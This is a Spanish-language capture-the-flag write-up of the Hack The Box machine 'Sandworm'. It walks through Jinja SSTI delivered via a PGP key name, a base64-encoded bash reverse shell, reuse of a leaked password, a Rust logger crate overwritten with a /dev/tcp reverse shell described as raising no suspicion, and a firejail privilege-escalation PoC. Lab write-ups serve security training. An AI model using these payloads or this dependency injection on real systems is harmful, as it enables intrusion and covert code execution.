---
tags:
title: Sandworm - Medium (HTB)
permalink: /Sandworm-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Recon

```bash
zs1n$ nmapf 10.129.229.16
Nmap Full scan in progress
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-25 18:30 -0500
Initiating Ping Scan at 18:30
Scanning 10.129.229.16 [4 ports]
Completed Ping Scan at 18:30, 0.39s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 18:30
Completed Parallel DNS resolution of 1 host. at 18:30, 0.50s elapsed
Initiating SYN Stealth Scan at 18:30
Scanning 10.129.229.16 [65535 ports]
Discovered open port 22/tcp on 10.129.229.16
Discovered open port 80/tcp on 10.129.229.16
Discovered open port 443/tcp on 10.129.229.16
Completed SYN Stealth Scan at 18:30, 13.60s elapsed (65535 total ports)
Nmap scan report for 10.129.229.16
Host is up, received echo-reply ttl 63 (0.39s latency).
Scanned at 2026-02-25 18:30:04 EST for 14s
Not shown: 40495 closed tcp ports (reset), 25037 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack ttl 63
80/tcp  open  http    syn-ack ttl 63
443/tcp open  https   syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 14.70 seconds
           Raw packets sent: 123281 (5.424MB) | Rcvd: 55135 (2.206MB)
-e [*] IP: 10.129.229.16
[*] Puertos abiertos: 22,80,443
/usr/bin/xclip
-e [*] Service scanning with nmap against 22,80,443 Ports..
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-25 18:30 -0500
Nmap scan report for 10.129.229.16
Host is up (0.52s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://ssa.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
|_http-title: Secret Spy Agency | Secret Security Service
|_http-server-header: nginx/1.18.0 (Ubuntu)
| ssl-cert: Subject: commonName=SSA/organizationName=Secret Spy Agency/stateOrProvinceName=Classified/countryName=SA
| Not valid before: 2023-05-04T18:03:25
|_Not valid after:  2050-09-19T18:03:25
|_ssl-date: TLS randomness does not represent time
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 49.54 seconds
```

```bash
zs1n$ addhost 10.129.229.16 ssa.htb
[+] Added new entry: 10.129.229.16 ssa.htb to /etc/hosts
10.129.229.16 ssa.htb
```
## Website

En la pagina principal se hostea una especie de conversor de claves `PGP`.

![image-center](/assets/images/Pasted image 20260225203114.png)
### Encrypted text section

En una de sus secciones se puede ver un campo, en el cual podemos ingresar el contenido de una clave `pgp` y la pagina la desencripta.

![image-center](/assets/images/Pasted image 20260225203445.png)
### Gobuster

El escaneo de `gobuster` no mostro mucha cosa.

```bash
zs1n$ gobuster dir -u https://ssa.htb -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 200 -k
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://ssa.htb
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
view                 (Status: 302) [Size: 225] [--> /login?next=%2Fview]
login                (Status: 200) [Size: 4392]
contact              (Status: 200) [Size: 3543]
about                (Status: 200) [Size: 5584]
admin                (Status: 302) [Size: 227] [--> /login?next=%2Fadmin]
guide                (Status: 200) [Size: 9043]
pgp                  (Status: 200) [Size: 3187]
logout               (Status: 302) [Size: 229] [--> /login?next=%2Flogout]
Progress: 1659 / 220558 (0.75%)^C
```
### Testing

Veo que en la seccion de `guide` muestra un enlace para que nosotros podamos descargarnos la clave publica de la maquina.

![image-center](/assets/images/Pasted image 20260225205644.png)
### Import key

Usando la misma, puedo usar `gpg` para importar la misma y ver a quien corresponde.

```bash
zs1n$ gpg --import ssa.asc
gpg: key C61D429110B625D4: public key "SSA (Official PGP Key of the Secret Spy Agency.) <atlas@ssa.htb>" imported
gpg: Total number processed: 1
gpg:               imported: 1
```
### Decrypt message

Voy a probar usar la clave para cifrar el contenido de un archivo que cree.

```bash
zs1n$ cat mensaje.txt
zsln was here!
```

Luego usando la misma herramienta la cifro.

```bash
zs1n$ gpg --encrypt -a -o - -r atlas@ssa.htb mensaje.txt
gpg: 6BB733D928D14CE6: There is no assurance this key belongs to the named user

sub  rsa4096/6BB733D928D14CE6 2023-05-04 SSA (Official PGP Key of the Secret Spy Agency.) <atlas@ssa.htb>
 Primary key fingerprint: D6BA 9423 021A 0839 CCC6  F3C8 C61D 4291 10B6 25D4
      Subkey fingerprint: 4BAD E0AE B5F5 5080 6083  D5AC 6BB7 33D9 28D1 4CE6

It is NOT certain that the key belongs to the person named
in the user ID.  If you *really* know what you are doing,
you may answer the next question with yes.

Use this key anyway? (y/N) y
-----BEGIN PGP MESSAGE-----

hQIMA2u3M9ko0UzmAQ/+IkIWt8Nb7rbuihHZyL29j0RwKLsKvQNf6QK4idyUf7Pp
zdB5Fia8vhYIvOrIU8lzYlKLMGFX2Xck1s0nC5PzKJUdccvhtNk0AaCuUuJlSJ4R
rOShio/zhs8Wdu1fS6oowLefcMpDNNPeGKTfZyf2RxmcKrGJRfpoxh7Ni4KKIY7N
TkXTWgFgdXKk6FW4kTP33s4mCj4WZTwyj7hdwzOpBnEvEBzEyHDppJmjNZWK4gQo
/rzNsdHsQrqapoXPOZHjwcZ1rqNM8k39+n/5pJ4FCiyW33pBvsqbJSOKI6JmrCgZ
hrviCJaZXr7ijShnM/51XN4LYrO3NSRbCzQvxzE6Ky2ZHATJdtwfwGkGNxa+U/MI
lHGRBQlDL9HO47RYKXipEi6ywNueFvQdwHwZ+aVA8pXRjyeLsXJwLRxNQA86bE99
all4IyNBQ9N9fwaqCOan99fm8ybCsqV0vgcfJBex6AS+nZzlBFj9B6S7BaA55INv
jnY/2JXIukWUohNlLKXLY6+Mla4MeDnobr++X1pK1VW2bTwdGAluoOivPFMlvIdV
zyhHNGPETkBg7IKOqSiKq6MwuAmi8ISDVl9BPP//efXKQANhOGs1gB9/OOutZLjm
hfJWhytAAxBS/1UHGNJt/A5kEBOq+9HNfbe5UQDsf4RTXU+jVUaPBG+VP1JK3FjS
YAHZgQCMpwGxFNn57KQQhZuUhMQJ29FgdBfNI/+xDDH2sAli/zsORwq9eU1wg7+2
tDGDgo6RkCqoVdY6Dsaz0Z7BJvuaDxV0K/ayNRTgu7I5saER2yuNQqJll4HnYg6y
xA==
=aijo
-----END PGP MESSAGE-----
```

Pegando el contenido del comando en la pagina, veo mi mensaje.

![image-center](/assets/images/Pasted image 20260225205032.png)
## Shell as atlas in Jail
### SSTI 

Como la pagina corre con `flask` puedo pensar en un `SSTI (Server Side Template Injection)`. Para eso uso el campo del `name` probando un simple payload como `{{ 7*7 }}`

```bash
zs1n$ gpg --generate-key
gpg (GnuPG) 2.4.8; Copyright (C) 2025 g10 Code GmbH
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

Note: Use "gpg --full-generate-key" for a full featured key generation dialog.

GnuPG needs to construct a user ID to identify your key.

Real name: {{7*7}}
Email address: test@ssa.htb
You selected this USER-ID:
    "{{7*7}} <test@ssa.htb>"

Change (N)ame, (E)mail, or (O)kay/(Q)uit? O
We need to generate a lot of random bytes. It is a good idea to perform
some other action (type on the keyboard, move the mouse, utilize the
disks) during the prime generation; this gives the random number
generator a better chance to gain enough entropy.
We need to generate a lot of random bytes. It is a good idea to perform
some other action (type on the keyboard, move the mouse, utilize the
disks) during the prime generation; this gives the random number
generator a better chance to gain enough entropy.
gpg: revocation certificate stored as '/home/zsln/.gnupg/openpgp-revocs.d/0A53153812E221A4B383252A2B95F44225495CA6.rev'
public and secret key created and signed.

pub   ed25519 2026-02-26 [SC] [expires: 2029-02-25]
      0A53153812E221A4B383252A2B95F44225495CA6
uid                      {{7*7}} <test@ssa.htb>
sub   cv25519 2026-02-26 [E] [expires: 2029-02-25]
```
### Cypher text

Luego vuelvo a cifrar el contenido del mismo.

```bash
zs1n$ gpg --clearsign -o- --local-user test@ssa.htb mensaje.txt
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

{{ 7*7 }}

zsln was here!
-----BEGIN PGP SIGNATURE-----

iIMEARYKACsWIQQKUxU4EuIhpLODJSorlfRCJUlcpgUCaZ+ODw0cdGVzdEBzc2Eu
aHRiAAoJECuV9EIlSVymCX4BAMAhFb4PvNG0hptCazZQ+sW1pWGhfu3G+ZG4be5I
2VGKAQD2NCbIuckLbAuCfu8BFW7V45dBgnG2eu6+Yx/JCn7XBQ==
=/+3v
-----END PGP SIGNATURE-----
```

Y para lo que quiero hacer también necesito obtener la clave publica.

```bash
zs1n$ gpg --armor --export "test@ssa.htb"
-----BEGIN PGP PUBLIC KEY BLOCK-----

mDMEaZ+NnRYJKwYBBAHaRw8BAQdA1H4dthXBJYpxGvSmNN87ISR9vbJY7ymSaSeD
5CsN4Qq0Fnt7Nyo3fX0gPHRlc3RAc3NhLmh0Yj6IlgQTFgoAPhYhBApTFTgS4iGk
s4MlKiuV9EIlSVymBQJpn42dAhsDBQkFo5qABQsJCAcCBhUKCQgLAgQWAgMBAh4B
AheAAAoJECuV9EIlSVym1O0BAIV4Hp4Ik0+resC9KCPUahh/jWDewAY0ndM0LbH2
KZkhAQDGC6DQhuT7Fd2qh8xZSSpnaoIv35+OtYqlMWafddpmBrg4BGmfjZ0SCisG
AQQBl1UBBQEBB0BYDILmF2/QnV7R3uUfSgrDYK5Xm9ZrYAAn6iof5JHOGgMBCAeI
fgQYFgoAJhYhBApTFTgS4iGks4MlKiuV9EIlSVymBQJpn42dAhsMBQkFo5qAAAoJ
ECuV9EIlSVymv0YBAM9ZWvrOVlVSt0HnGObba2TefS1WncV050p7YhKwneWMAQCs
nBgu3CwJeWpP+Qjy4xfgFh6d1Xjebr6EARg56/zpCQ==
=M8ib
-----END PGP PUBLIC KEY BLOCK-----
```
### Success

Proporcionando ambos contenidos, veo que en el output me devuelve `49`, resultado de la multiplicación.

![image-center](/assets/images/Pasted image 20260225211123.png)
### RCE

Así que para probar una posible ejecución de comandos use el siguiente payload de el repositorio de [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md)

```bash
{{ namespace.__init__.__globals__.os.popen('id').read() }}
```

Volví a realizar todo el proceso.

```bash
zs1n$ gpg --generate-key
gpg (GnuPG) 2.4.8; Copyright (C) 2025 g10 Code GmbH
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

Note: Use "gpg --full-generate-key" for a full featured key generation dialog.

GnuPG needs to construct a user ID to identify your key.

Real name: {{ namespace.__init__.__globals__.os.popen('id').read() }}
Email address: testing@ssa.htb
You selected this USER-ID:
    "{{ namespace.__init__.__globals__.os.popen('id').read() }} <testing@ssa.htb>"

Change (N)ame, (E)mail, or (O)kay/(Q)uit? O
..SNIP..
```

Volvi a subir los contenido tanto de la clave publica como del mensaje cifrado, y vi el output de mi comando.

![image-center](/assets/images/Pasted image 20260225212113.png)
### Shell

Por lo que luego cree una reverse shell para mi maquina.

```bash
{{ namespace.__init__.__globals__.os.popen('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNy4xOS80NDQ0IDA+JjEK | base64 -d | bash').read() }}
```

Y luego de repetir todo el proceso, obtuve una shell como el usuario `atlas`.

```bash
sudo nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.229.16] 59880
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
/usr/local/sbin/lesspipe: 1: dirname: not found
atlas@sandworm:/var/www/html/SSA$ 
```
## Shell as silentobserver
### Config file

Viendo un archivo de configuracion, vi las credenciales del usuario `silentobserver`.

```bash
atlas@sandworm:~/.config/httpie/sessions/localhost_5000$ cat admin.json
{
    "__meta__": {
        "about": "HTTPie session file",
        "help": "https://httpie.io/docs#sessions",
        "httpie": "2.6.0"
    },
    "auth": {
        "password": "quietLiketheWind22",
        "type": null,
        "username": "silentobserver"
..snip..
```
## Shell

Las mismas son validas para `ssh`.

```bash
zs1n$ ssh silentobserver@10.129.229.16
silentobserver@10.129.229.16 password:
..snip..
silentobserver@sandworm:~$ cat user.txt
905a0ac4b110084c65f5d2f4272aaead
```
## Shell as atlas
### Cron task

Subi `pspy` y vi que cada cierto intervalo de tiempo, una tarea se ejecutaba en `/opt/tipnet`.

```bash
2026/02/26 01:13:24 CMD: UID=0     PID=2      |
2026/02/26 01:13:24 CMD: UID=0     PID=1      | /sbin/init maybe-ubiquity
2026/02/26 01:14:01 CMD: UID=0     PID=6180   | /bin/sh -c cd /opt/tipnet && /bin/echo "e" | /bin/sudo -u atlas /usr/bin/cargo run --offline
2026/02/26 01:14:01 CMD: UID=0     PID=6179   | /usr/sbin/CRON -f -P
2026/02/26 01:14:01 CMD: UID=0     PID=6178   | /usr/sbin/CRON -f -P
2026/02/26 01:14:01 CMD: UID=0     PID=6182   | /bin/sudo -u atlas /usr/bin/cargo run --offline
2026/02/26 01:14:01 CMD: UID=0     PID=6181   |
2026/02/26 01:14:01 CMD: UID=0     PID=6183   | /usr/sbin/CRON -f -P
2026/02/26 01:14:01 CMD: UID=0     PID=6184   | /bin/sh -c sleep 10 && /root/Cleanup/clean_c.sh
2026/02/26 01:14:01 CMD: UID=1000  PID=6185   | /usr/bin/cargo run --offline
2026/02/26 01:14:01 CMD: UID=1000  PID=6186   | rustc -vV
2026/02/26 01:14:01 CMD: UID=1000  PID=6187   | /usr/bin/cargo run --offline
2026/02/26 01:14:01 CMD: UID=1000  PID=6189   | /usr/bin/cargo run --offline
```
### Rust file
Viendo el contenido de esta carpeta vi un archivo en código `rust`.

```bash
silentobserver@sandworm:~/.cargo/registry/cache/github.com-1ecc6299db9ec823$ ls -la /opt/tipnet
ls -la /opt/tipnet/src
total 108
drwxr-xr-x 5 root  atlas  4096 Jun  6  2023 .
drwxr-xr-x 4 root  root   4096 Feb 26 01:14 ..
-rw-rw-r-- 1 atlas atlas 28272 Feb 26 01:14 access.log
-rw-r--r-- 1 root  atlas 46161 May  4  2023 Cargo.lock
-rw-r--r-- 1 root  atlas   288 May  4  2023 Cargo.toml
drwxr-xr-- 6 root  atlas  4096 Jun  6  2023 .git
-rwxr-xr-- 1 root  atlas     8 Feb  8  2023 .gitignore
drwxr-xr-x 2 root  atlas  4096 Jun  6  2023 src
drwxr-xr-x 3 root  atlas  4096 Jun  6  2023 target
total 16
drwxr-xr-x 2 root atlas 4096 Jun  6  2023 .
drwxr-xr-x 5 root atlas 4096 Jun  6  2023 ..
-rwxr-xr-- 1 root atlas 5795 May  4  2023 main.rs
```

El contenido del mismo era este.

```rust
silentobserver@sandworm:~/.cargo/registry/cache/github.com-1ecc6299db9ec823$ cat /opt/tipnet/src/main.rs
extern crate logger;
use sha2::{Digest, Sha256};
use chrono::prelude::*;
use mysql::*;
use mysql::prelude::*;
use std::fs;
use std::process::Command;
use std::io;

// We don't spy on you... much.

struct Entry {
    timestamp: String,
    target: String,
    source: String,
    data: String,
}

fn main() {
    println!("
             ,,
MMP\"\"MM\"\"YMM db          `7MN.   `7MF'         mm
P'   MM   `7               MMN.    M           MM
     MM    `7MM `7MMpdMAo. M YMb   M  .gP\"Ya mmMMmm
     MM      MM   MM   `Wb M  `MN. M ,M'   Yb  MM
     MM      MM   MM    M8 M   `MM.M 8M\"\"\"\"\"\"  MM
     MM      MM   MM   ,AP M     YMM YM.    ,  MM
   .JMML.  .JMML. MMbmmd'.JML.    YM  `Mbmmd'  `Mbmo
                  MM
                .JMML.

");


    let mode = get_mode();

    if mode == "" {
	    return;
    }
    else if mode != "upstream" && mode != "pull" {
        println!("[-] Mode is still being ported to Rust; try again later.");
        return;
    }

    let mut conn = connect_to_db("Upstream").unwrap();


    if mode == "pull" {
        let source = "/var/www/html/SSA/SSA/submissions";
        pull_indeces(&mut conn, source);
        println!("[+] Pull complete.");
        return;
    }

    println!("Enter keywords to perform the query:");
    let mut keywords = String::new();
    io::stdin().read_line(&mut keywords).unwrap();

    if keywords.trim() == "" {
        println!("[-] No keywords selected.\n\n[-] Quitting...\n");
        return;
    }

    println!("Justification for the search:");
    let mut justification = String::new();
    io::stdin().read_line(&mut justification).unwrap();

    // Get Username
    let output = Command::new("/usr/bin/whoami")
        .output()
        .expect("nobody");

    let username = String::from_utf8(output.stdout).unwrap();
    let username = username.trim();

    if justification.trim() == "" {
        println!("[-] No justification provided. TipNet is under 702 authority; queries don't need warrants, but need to be justified. This incident has been logged and will be reported.");
        logger::log(username, keywords.as_str().trim(), "Attempted to query TipNet without justification.");
        return;
    }

    logger::log(username, keywords.as_str().trim(), justification.as_str());

    search_sigint(&mut conn, keywords.as_str().trim());

}

fn get_mode() -> String {

	let valid = false;
	let mut mode = String::new();

	while ! valid {
		mode.clear();

		println!("Select mode of usage:");
		print!("a) Upstream \nb) Regular (WIP)\nc) Emperor (WIP)\nd) SQUARE (WIP)\ne) Refresh Indeces\n");

		io::stdin().read_line(&mut mode).unwrap();

		match mode.trim() {
			"a" => {
			      println!("\n[+] Upstream selected");
			      return "upstream".to_string();
			}
			"b" => {
			      println!("\n[+] Muscular selected");
			      return "regular".to_string();
			}
			"c" => {
			      println!("\n[+] Tempora selected");
			      return "emperor".to_string();
			}
			"d" => {
				println!("\n[+] PRISM selected");
				return "square".to_string();
			}
			"e" => {
				println!("\n[!] Refreshing indeces!");
				return "pull".to_string();
			}
			"q" | "Q" => {
				println!("\n[-] Quitting");
				return "".to_string();
			}
			_ => {
				println!("\n[!] Invalid mode: {}", mode);
			}
		}
	}
	return mode;
}

fn connect_to_db(db: &str) -> Result<mysql::PooledConn> {
    let url = "mysql://tipnet:4The_Greater_GoodJ4A@localhost:3306/Upstream";
    let pool = Pool::new(url).unwrap();
    let mut conn = pool.get_conn().unwrap();
    return Ok(conn);
}

fn search_sigint(conn: &mut mysql::PooledConn, keywords: &str) {
    let keywords: Vec<&str> = keywords.split(" ").collect();
    let mut query = String::from("SELECT timestamp, target, source, data FROM SIGINT WHERE ");

    for (i, keyword) in keywords.iter().enumerate() {
        if i > 0 {
            query.push_str("OR ");
        }
        query.push_str(&format!("data LIKE '%{}%' ", keyword));
    }
    let selected_entries = conn.query_map(
        query,
        |(timestamp, target, source, data)| {
            Entry { timestamp, target, source, data }
        },
        ).expect("Query failed.");
    for e in selected_entries {
        println!("[{}] {} ===> {} | {}",
                 e.timestamp, e.source, e.target, e.data);
    }
}

fn pull_indeces(conn: &mut mysql::PooledConn, directory: &str) {
    let paths = fs::read_dir(directory)
        .unwrap()
        .filter_map(|entry| entry.ok())
        .filter(|entry| entry.path().extension().unwrap_or_default() == "txt")
        .map(|entry| entry.path());

    let stmt_select = conn.prep("SELECT hash FROM tip_submissions WHERE hash = :hash")
        .unwrap();
    let stmt_insert = conn.prep("INSERT INTO tip_submissions (timestamp, data, hash) VALUES (:timestamp, :data, :hash)")
        .unwrap();

    let now = Utc::now();

    for path in paths {
        let contents = fs::read_to_string(path).unwrap();
        let hash = Sha256::digest(contents.as_bytes());
        let hash_hex = hex::encode(hash);

        let existing_entry: Option<String> = conn.exec_first(&stmt_select, params! { "hash" => &hash_hex }).unwrap();
        if existing_entry.is_none() {
            let date = now.format("%Y-%m-%d").to_string();
            println!("[+] {}\n", contents);
            conn.exec_drop(&stmt_insert, params! {
                "timestamp" => date,
                "data" => contents,
                "hash" => &hash_hex,
                },
                ).unwrap();
        }
    }
    logger::log("ROUTINE", " - ", "Pulling fresh submissions into database.");

}
```
### Cargo hijacking

Además la vuln se da en el siguiente archivo `.toml`, en el cual se ve como `cargo` define la librería principal de `tipnet` no desde repositorio central como `crates.io` sino desde una ruta relativa en el sistema de archivos de la maquina.

```toml
silentobserver@sandworm:/opt/tipnet/src$ cat /opt/tipnet/Cargo.toml
[package]
name = "tipnet"
version = "0.1.0"
edition = "2021"

# See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html

[dependencies]
chrono = "0.4"
mysql = "23.0.1"
nix = "0.18.0"
logger = {path = "../crates/logger"}
sha2 = "0.9.0"
hex = "0.4.3"
```

Donde viendo archivos en los que tengamos permisos de escritura vemos en `/logger/src/` un archivo.

```bash
silentobserver@sandworm:/opt/tipnet/src$ ls -la /opt/crates/logger/src/lib.rs
-rw-rw-r-- 1 atlas silentobserver 732 May  4  2023 /opt/crates/logger/src/lib.rs
```
### Overwrite file

Por lo que lo reescribí de la siguiente manera. Haciendo que se ejecute el `main.rs` cargando dicha libreria maliciosa con mi `Reverse Shell` dentro.

```bash
cat << EOF > /opt/crates/logger/src/lib.rs
use std::process::Command;

pub fn log(user: &str, key: &str, just: &str) {
    let _ = Command::new("bash")
        .arg("-c")
        .arg("bash -i >& /dev/tcp/10.10.17.19/4445 0>&1")
        .spawn();

    // Esto mantiene la consola limpia y no levanta sospechas
    println!("Logging: {} | {} | {}", user, key, just);
}
EOF
```
## Shell

Luego de que la tarea cron volviera a correr, recibí mi shell como el usuario `atlas`. Donde vi que pertenece a un nuevo grupo.

```bash
sudo nc -nvlp 4445
listening on [any] 4445 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.229.16] 41696
bash: cannot set terminal process group (6524): Inappropriate ioctl for device
bash: no job control in this shell
atlas@sandworm:/opt/tipnet$ id
id
uid=1000(atlas) gid=1000(atlas) groups=1000(atlas),1002(jailer)
```

Buscando los permisos de este grupo sobre archivos, vi que pueden ejecutar `firejail` como root.

```bash
atlas@sandworm:/opt/tipnet$ find / -group jailer 2>/dev/null
/usr/local/bin/firejail
```
### CVE-2022-31214

Por lo que use un [poc publico](https://seclists.org/oss-sec/2022/q2/188).

```bash
atlas@sandworm:/tmp$ python3 poc.py
You can now run 'firejail --join=7238' in another terminal to obtain a shell where 'sudo su -' should grant you a root shell.
```
### Shell

Y luego desde otra terminal, ejecute tal cual lo que dice en el output del comando, dándome así una shell como `root`.

```bash
atlas@sandworm:~$ firejail --join=7238
changing root to /proc/7238/root
Warning: cleaning all supplementary groups
Child process initialized in 4.05 ms
atlas@sandworm:~$ sudo su -
atlas is not in the sudoers file.  This incident will be reported.
atlas@sandworm:~$ su -
root@sandworm:~#
```

```bash
root@sandworm:~# cat /root/root.txt
f0f77dc815ef1e234023605b3584f386
```

`~Happy Hacking.`